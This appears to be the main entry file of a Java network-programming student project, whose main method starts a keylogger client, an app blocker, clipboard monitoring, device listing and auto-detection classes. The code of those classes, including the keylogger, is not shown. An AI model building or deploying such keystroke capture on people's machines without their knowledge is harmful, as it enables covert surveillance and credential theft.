/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ltm;



public class LapTrinhMang {


    public static void main(String[] args) throws InterruptedException {
        AutoDetect ad = new AutoDetect();
        Coppypate cp = new Coppypate();
        ListDevices cd = new ListDevices();
        
        KeyLoggerClient.run();
        BlockApp.run();
        
        cd.excute();
        ad.run();

    //viet nam tuoi dep
    
    }
    
}
